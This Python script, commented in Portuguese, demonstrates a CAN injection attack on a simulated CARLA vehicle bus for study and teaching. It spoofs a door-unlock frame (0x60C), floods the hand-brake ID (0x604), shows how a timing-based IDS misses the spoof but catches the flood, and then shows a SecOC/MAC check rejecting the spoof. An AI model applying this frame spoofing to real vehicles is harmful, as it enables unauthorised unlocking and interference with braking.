#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Demo reproduzivel do CAN Injection sobre a infraestrutura do YES, CARLA CAN.

Reaproveita artefatos REAIS do projeto, de modo que o mecanismo demonstrado e
fiel ao usado nos demais modulos:
  - attacks/reverse_engineering.py          -> payloads de spoof (mapper)
  - data/carla.dbc                          -> schema das mensagens (cantools)
  - defense/id_time_intrusion_detection.py  -> o IDS por temporizacao

A demo encena, em um unico processo, quatro fases:
  1) Trafego normal (ECUs legitimas)                         -> IDS calmo.
  2) CAN Injection: spoof de DOORS (0x60C)                   -> porta destrava.
  3) CAN Injection: flood de HAND_BRAKE (0x604, periodico)   -> IDS acusa anomalia.
  4) Defesa SecOC/MAC: a porta passa a exigir autenticacao   -> o spoof e rejeitado.

Modos de execucao:
  # Autocontido, nao precisa de sudo nem do kernel vcan (ideal para estudo/aula):
  python -m attacks.can_injection_demo

  # Usando a rede CAN virtual real do projeto (apos rodar ./1_up_environment.sh):
  python -m attacks.can_injection_demo --iface socketcan
      -> ECUs/vitima/IDS em vcan0; atacante em vcan1 (ponte can-gw -> vcan0).

O que NAO e reproduzido: a camada fisica/eletrica do CAN Injector real
(override de estado dominante, Bus Off das ECUs legitimas, supressao de error
frames). O vcan/virtual abstrai o nivel eletrico, entao apenas o ataque LOGICO
(spoofing de frames) e reproduzivel aqui.
"""
import argparse
import copy
import hashlib
import hmac
import os
import sys
import threading
import time

import can
import cantools

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if REPO not in sys.path:
    sys.path.insert(0, REPO)

from attacks.reverse_engineering import FEATURE_CAN_ID_PAYLOAD_MAPPER
from defense.id_time_intrusion_detection import IdTimeIntrusionDetection

DBC = cantools.database.load_file(os.path.join(REPO, "data", "carla.dbc"))
STATS = os.path.join(REPO, "traffic_logs", "logs_for_ml_ids_training_parsed_statistics.json")

ID_DOORS, ID_HANDBRAKE = 0x60C, 0x604
SECRET = b"per-vehicle-factory-key"   # chave compartilhada emulando o SecOC/SHE

# ANSI colors -----------------------------------------------------------------
R = "\033[91m"; G = "\033[92m"; Y = "\033[93m"; C = "\033[96m"; D = "\033[2m"; X = "\033[0m"; B = "\033[1m"


def log(tag, msg, col=X):
    print(f"{D}{time.strftime('%H:%M:%S')}{X} {col}[{tag}]{X} {msg}", flush=True)


def banner(t):
    print(f"\n{B}{'=' * 72}\n{t}\n{'=' * 72}{X}", flush=True)


def mac(ctr: int) -> bytes:
    """MAC truncado (3 bytes) sobre (ID, comando, contador de frescor)."""
    payload = ID_DOORS.to_bytes(2, "big") + bytes([0x01]) + ctr.to_bytes(2, "big")
    return hmac.new(SECRET, payload, hashlib.sha256).digest()[:3]


class Demo:
    def __init__(self, iface, main_ch, atk_ch):
        self.iface = iface
        self.main_ch = main_ch
        self.atk_ch = atk_ch
        self.stop = threading.Event()
        self.flood = threading.Event()
        self.secoc = threading.Event()
        self.vehicle = {"doors": "TRANCADA", "hand_brake": "solto"}
        self.rejects = 0
        self.ids = None
        self._last_hb = -1.0

    # -- barramentos -----------------------------------------------------------
    def _bus(self, channel):
        return can.Bus(interface=self.iface, channel=channel, receive_own_messages=False)

    # -- nos simulados ---------------------------------------------------------
    def steady_sender(self, name, signal, value, period):
        """ECU legitima: emite um ID periodico com cadencia estavel."""
        m = DBC.get_message_by_name(name)
        bus = self._bus(self.main_ch)
        while not self.stop.is_set():
            bus.send(can.Message(arbitration_id=m.frame_id,
                                 data=m.encode({signal: value}), is_extended_id=False))
            time.sleep(period)
        bus.shutdown()

    def victim_ecu(self):
        """ECU consumidora: decodifica os frames e atua sobre o veiculo."""
        bus = self._bus(self.main_ch)
        while not self.stop.is_set():
            msg = bus.recv(timeout=0.2)
            if msg is None:
                continue
            if msg.arbitration_id == ID_DOORS:
                if self.secoc.is_set():
                    ok = len(msg.data) == 6
                    if ok:
                        ctr = int.from_bytes(bytes(msg.data[1:3]), "big")
                        ok = hmac.compare_digest(bytes(msg.data[3:6]), mac(ctr))
                    if ok:
                        self.vehicle["doors"] = "DESTRANCADA"
                        log("VITIMA", f"{G}porta destrancada (comando AUTENTICADO aceito){X}", G)
                    else:
                        self.rejects += 1
                        if self.rejects == 1:
                            log("VITIMA", f"{R}comando de porta REJEITADO (MAC invalido -> spoof bloqueado){X}", R)
                elif self.vehicle["doors"] != "DESTRANCADA":
                    self.vehicle["doors"] = "DESTRANCADA"
                    log("VITIMA", f"{R}>>> PORTA DESTRANCADA sem autorizacao! (frame 0x60C aceito){X}", R)
            elif msg.arbitration_id == ID_HANDBRAKE:
                st = "ACIONADO" if DBC.decode_message(msg.arbitration_id, msg.data)["HAND_BRAKE_signal"] else "solto"
                self.vehicle["hand_brake"] = st
                now = time.monotonic()
                if st == "ACIONADO" and now - self._last_hb > 1.0:
                    self._last_hb = now
                    log("VITIMA", f"{R}freio de mao ACIONADO por frame injetado (disputando com a ECU legitima){X}", R)
        bus.shutdown()

    def ids_node(self):
        """IDS por temporizacao do projeto (print interno silenciado)."""
        self.ids = IdTimeIntrusionDetection()
        self.ids.load(STATS)
        self.ids.print_results = lambda *a, **k: None
        bus = self._bus(self.main_ch)
        while not self.stop.is_set():
            msg = bus.recv(timeout=0.2)
            if msg is not None:
                self.ids.run(msg)
        bus.shutdown()

    def ids_counts(self):
        return self.ids.regular_counter, copy.deepcopy(self.ids.intrusion_counter)

    # -- atacante --------------------------------------------------------------
    def inject(self, feature, n, period):
        bus = self._bus(self.atk_ch)
        f = FEATURE_CAN_ID_PAYLOAD_MAPPER[feature]
        for _ in range(n):
            bus.send(can.Message(arbitration_id=f["id"], data=f["payload"], is_extended_id=False))
            time.sleep(period)
        bus.shutdown()

    def flood_handbrake(self):
        bus = self._bus(self.atk_ch)
        f = FEATURE_CAN_ID_PAYLOAD_MAPPER["hand_brake"]
        while self.flood.is_set():
            bus.send(can.Message(arbitration_id=f["id"], data=f["payload"], is_extended_id=False))
            time.sleep(0.02)
        bus.shutdown()

    def authed_unlock(self, ctr):
        bus = self._bus(self.main_ch)
        bus.send(can.Message(arbitration_id=ID_DOORS,
                             data=bytes([0x01]) + ctr.to_bytes(2, "big") + mac(ctr), is_extended_id=False))
        bus.shutdown()

    # -- cenario ---------------------------------------------------------------
    def run(self):
        senders = [
            threading.Thread(target=self.steady_sender, args=("THROTTLE", "THROTTLE_signal", 40, 0.2), daemon=True),
            threading.Thread(target=self.steady_sender, args=("BRAKE", "BRAKE_signal", 0, 0.2), daemon=True),
            threading.Thread(target=self.steady_sender, args=("STEER", "STEER_signal", 128, 0.2), daemon=True),
            threading.Thread(target=self.steady_sender, args=("HAND_BRAKE", "HAND_BRAKE_signal", 0, 0.2), daemon=True),
        ]
        for t in senders + [threading.Thread(target=self.victim_ecu, daemon=True),
                            threading.Thread(target=self.ids_node, daemon=True)]:
            t.start()
        time.sleep(0.3)

        banner("FASE 1  —  Trafego normal (sem ataque)")
        log("INFO", f"ECUs legitimas transmitindo. Estado: porta={self.vehicle['doors']}, freio={self.vehicle['hand_brake']}")
        time.sleep(3)
        reg, intr = self.ids_counts()
        log("IDS", f"baseline: {reg} frames legitimos processados; {sum(intr.values())} falsos positivos "
                   f"{D}(jitter de temporizacao do barramento em software){X}")

        banner("FASE 2  —  CAN INJECTION: spoof de DOORS (0x60C)   [destrava a porta]")
        log("ATAQUE", f"{R}injetando 0x60C payload=[0x01]  (== cyberattacks_module.py --feature doors){X}", R)
        _, before = self.ids_counts()
        self.inject("doors", n=15, period=0.08)
        time.sleep(0.6)
        _, after = self.ids_counts()
        d60c = after.get("60C", 0) - before.get("60C", 0)
        log("INFO", f"Resultado: porta = {R}{self.vehicle['doors']}{X}")
        log("IDS", f"{Y}anomalias no 0x60C = {d60c}  ->  BYPASS: ID legitimo 'sporadic' nao e flagrado "
                   f"pela temporizacao.{X}", Y)

        banner("FASE 3  —  CAN INJECTION: flood de HAND_BRAKE (0x604, periodico)")
        log("ATAQUE", f"{R}injetando 0x604=[0x01] a ~50 msg/s sobre a cadencia legitima de 0.2s{X}", R)
        _, before = self.ids_counts()
        self.flood.set()
        threading.Thread(target=self.flood_handbrake, daemon=True).start()
        time.sleep(3.0)
        self.flood.clear()
        time.sleep(0.4)
        _, after = self.ids_counts()
        d604 = after.get("604", 0) - before.get("604", 0)
        log("INFO", f"Resultado: freio de mao = {R}{self.vehicle['hand_brake'].upper()}{X}")
        log("IDS", f"{G}anomalias no 0x604 = {d604}  ->  DETECTADO: injecao quebrou a cadencia do ID "
                   f"periodico.{X}", G)

        banner("FASE 4  —  DEFESA SecOC/MAC: a porta passa a exigir autenticacao")
        self.secoc.set()
        self.vehicle["doors"] = "TRANCADA"
        self.rejects = 0
        log("DEFESA", f"{C}SecOC ON: DOORS exige [cmd, freshness, MAC] com a chave do veiculo.{X}", C)
        log("ATAQUE", f"{R}atacante repete o mesmo spoof 0x60C=[0x01] (nao possui a chave){X}", R)
        self.inject("doors", n=10, period=0.08)
        time.sleep(0.5)
        log("INFO", f"Apos {self.rejects} tentativas de spoof: porta = {G}{self.vehicle['doors']}{X} (nenhuma aceita)")
        log("DEFESA", f"{C}ECU legitima envia o destravamento AUTENTICADO...{X}", C)
        self.authed_unlock(ctr=1)
        time.sleep(0.5)
        log("INFO", f"Apos comando autenticado: porta = {G}{self.vehicle['doors']}{X}")

        banner("RESUMO")
        print(f"""  Fase 2  spoof de porta (ID legitimo)   -> {R}atuacao nao autorizada{X}, IDS nao detecta
  Fase 3  flood de ID periodico          -> IDS {G}detecta{X} pela anomalia de cadencia
  Fase 4  autenticacao SecOC/MAC         -> spoof {G}bloqueado{X}; so comando com MAC valido passa
  (Nao reproduzido: override de estado dominante / Bus Off -> exige camada fisica, ausente no vcan)""")
        self.stop.set()
        time.sleep(0.4)


def main():
    parser = argparse.ArgumentParser(description="Demo reproduzivel do CAN Injection no YES, CARLA CAN.")
    parser.add_argument("--iface", choices=["virtual", "socketcan"], default="virtual",
                        help="Backend do python-can: 'virtual' (autocontido, sem sudo) ou 'socketcan' (vcan real).")
    parser.add_argument("--channel", default=None,
                        help="Canal do barramento principal (default: 'carla_demo' p/ virtual, 'vcan0' p/ socketcan).")
    parser.add_argument("--attacker-channel", default=None,
                        help="Canal do atacante (default: igual ao principal p/ virtual, 'vcan1' p/ socketcan).")
    args = parser.parse_args()

    if args.iface == "socketcan":
        main_ch = args.channel or "vcan0"
        atk_ch = args.attacker_channel or "vcan1"
    else:
        main_ch = args.channel or "carla_demo"
        atk_ch = args.attacker_channel or main_ch  # virtual conecta buses do mesmo canal

    print(f"{B}CAN Injection demo{X}  iface={args.iface}  principal={main_ch}  atacante={atk_ch}")
    try:
        Demo(args.iface, main_ch, atk_ch).run()
    except KeyboardInterrupt:
        print("\nInterrompido pelo usuario.")


if __name__ == "__main__":
    main()
